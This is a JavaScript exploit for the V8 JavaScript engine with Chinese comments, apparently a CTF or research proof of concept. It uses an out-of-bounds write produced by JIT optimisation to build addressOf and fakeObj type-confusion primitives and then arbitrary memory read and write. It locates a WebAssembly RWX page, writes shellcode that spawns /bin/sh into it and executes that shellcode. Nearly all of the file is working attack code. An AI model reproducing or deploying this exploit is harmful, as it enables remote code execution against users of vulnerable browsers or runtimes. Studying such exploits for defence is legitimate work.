

const backing_store_offset_of_wasm_instance = 0x68n;
const backing_store_offset_of_data_buf = 0x14n;
const fake_obj_offset_of_fake_array = 0x48n;

//1、init rwx memory
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule,{});
var f = wasmInstance.exports.main;
//2、lib function
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);


function ftoi(f){
    f64[0] = f;
    return bigUint64[0];
}

function itof(i){
    bigUint64[0] = i;
    return f64[0];
}

function getLow(double){
	f64[0] = double;
	return u32[0];
}

function getHigh(double){
	f64[0] = double;
	return u32[1];
}

function u32Tof64(low,high){
	u32[0] = low;
	u32[1] = high;
	return f64[0];
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
  }
  
  function d2u(v) {
    f64[0] = v;
    return u32;
  }

function hex(i){
    return i.toString(16).padStart(8,"0");
}



function read64(addr){
    fake_array[1] = itof(addr - 0x8n + 0x1n);
    return ftoi(fake_object[0]);
}

function write64(addr,data){
    fake_array[1] = itof(addr - 0x8n + 0x1n);
    fake_object[0] = itof(data);
}


function fakeObj(addr_to_fake){
    double_array[0] = itof(addr_to_fake + 1n);
    double_array[1] = obj_map;  // 把浮点型数组的map地址改为对象数组的map地址
    let faked_obj = double_array[0];
    return faked_obj;
}

function addressOf(obj_to_leak){
    obj_array[0] = obj_to_leak;
    double_array[8] = array_map; // 把obj数组的map地址改为浮点型数组的map地址
    let obj_addr = ftoi(obj_array[0]) - 1n;
    double_array[8] = obj_map; // 把obj数组的map地址改回来，以便后续使用
    return obj_addr;
}

function copyShellcodeToRwx(shellcode,rwx_addr){

    var data_buf = new ArrayBuffer(shellcode.length * 8);
    var data_view = new DataView(data_buf);
	var data_buf_address = addressOf(data_buf);
    var buf_backing_store_addr = data_buf_address + backing_store_offset_of_data_buf;

	console.log("[*] rwx_addr: 0x"+hex(rwx_addr));
    console.log("[*] buf_backing_store_addr: 0x" + hex(buf_backing_store_addr));

    write64(buf_backing_store_addr,rwx_addr);

    for(let i = 0;i < shellcode.length;i++){
        data_view.setFloat64(i * 8,itof(shellcode[i]),true);
    }
    
}




//3、poc
var double_array = [1.1];
var obj = {"a":1};
var obj_array = [obj];

array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double = new Float64Array(new BigUint64Array([0x2424242422222222n]).buffer)[0];

function trigger(array, oob) {
    var x = array.length;
    x -= 67108861; // 1 2
    x *= 10; // 10 20
    x -= 9; // 1 11
    oob[x] = length_as_double; // fake length
}
  
for (let i = 0; i < 30000; ++i) {
    vul = [1.1, 2.1];
    pad = [vul];
    double_array = [3.1];
    obj = {"a": 2.1};
    obj_array = [obj];
    trigger(giant_array, vul);
}
//① 越界读，获取array_map,obj_map
var array_map = double_array[1];
var obj_map = double_array[8];
console.log("[*] array_map = 0x" + hex(ftoi(array_map)));
console.log("[*] obj_map = 0x" + hex(ftoi(obj_map)));
var fake_array = [
    array_map, //注意这里是array_map不是obj_map
    itof(0x4141414141414141n)
];
//② 越界写，构造类型混淆，obj array->double array，获取fake_array地址，double array->obj array，伪造fake_obj
// fake_array[1]和fake_obj[0]对应同一块内存，通过fake_array读写时，v8认为这块内存保存的是一个8字节（64位）的double，通过fake_obj读写时v8认为保存的是对象指针
// 因此可以通过fake_array写入任意地址，通过fake_obj实现任意地址读写。

fake_array_addr = addressOf(fake_array);

console.log("[*] leak fake_array addr :0x"+hex(fake_array_addr));

fake_object_addr = fake_array_addr + fake_obj_offset_of_fake_array;

var fake_object = fakeObj(fake_object_addr);

var wasm_instance_addr = addressOf(wasmInstance);

console.log("[*] leak wasm_instance addr:0x" + hex(wasm_instance_addr));

var rwx_page_addr = read64(wasm_instance_addr + backing_store_offset_of_wasm_instance);

console.log("[*] leak rwx_page_addr : 0x"+hex(rwx_page_addr));

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
]
// ④wasm_instance的backing_store是rwx的，将data_buf的backing_store替换成wasm_instance的backing_store
copyShellcodeToRwx(shellcode,rwx_page_addr);

f();
